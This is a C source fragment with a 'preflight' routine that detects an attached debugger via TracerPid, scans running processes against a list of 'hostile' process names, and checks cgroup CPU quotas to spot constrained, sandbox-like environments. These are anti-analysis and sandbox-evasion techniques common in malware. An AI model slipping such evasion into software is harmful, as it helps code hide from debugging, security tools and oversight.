static int check_tracer_pid(void) {
    char status_path[64];
    snprintf(status_path, sizeof(status_path), "/proc/%d/status", getpid());

    FILE *sf = fopen(status_path, "r");
    if (!sf) return 0;

    char line[256];
    int result = 0;

    while (fgets(line, sizeof(line), sf)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            long tracer = strtol(line + 10, NULL, 10);
            if (tracer != 0) result = -1;
            break;
        }
    }
    fclose(sf);
    return result;
}

static int scan_hostile_processes(void) {
    DIR *proc = opendir("/proc");
    if (!proc) return -1;

    struct dirent *ent;
    char comm_path[128], comm_buf[256];

    while ((ent = readdir(proc)) != NULL) {
        if (ent->d_type != DT_DIR) continue;

        char *endp;
        long pid = strtol(ent->d_name, &endp, 10);
        if (*endp != '\0' || pid <= 0) continue;

        snprintf(comm_path, sizeof(comm_path), "/proc/%ld/comm", pid);
        FILE *cf = fopen(comm_path, "r");
        if (!cf) continue;

        if (fgets(comm_buf, sizeof(comm_buf), cf)) {
            comm_buf[strcspn(comm_buf, "\n")] = '\0';
            for (const char **hp = hostile_procs; *hp; hp++) {
                if (strstr(comm_buf, *hp)) {
                    fclose(cf);
                    closedir(proc);
                    return -1;
                }
            }
        }
        fclose(cf);
    }
    closedir(proc);
    return 0;
}

static int check_cgroup_quota(void) {
    FILE *cq = fopen("/sys/fs/cgroup/cpu/cpu.cfs_quota_us", "r");
    if (!cq) cq = fopen("/sys/fs/cgroup/cpu.max", "r");

    if (cq) {
        long quota;
        int valid = fscanf(cq, "%ld", &quota);
        fclose(cq);
        if (valid == 1 && quota > 0 && quota < 50000)
            return -1;
    }
    return 0;
}

static int preflight(void) {
    if (check_tracer_pid() != 0) return -1;
    if (scan_hostile_processes() != 0) return -1;
    if (check_cgroup_quota() != 0) return -1;
    return 0;
}

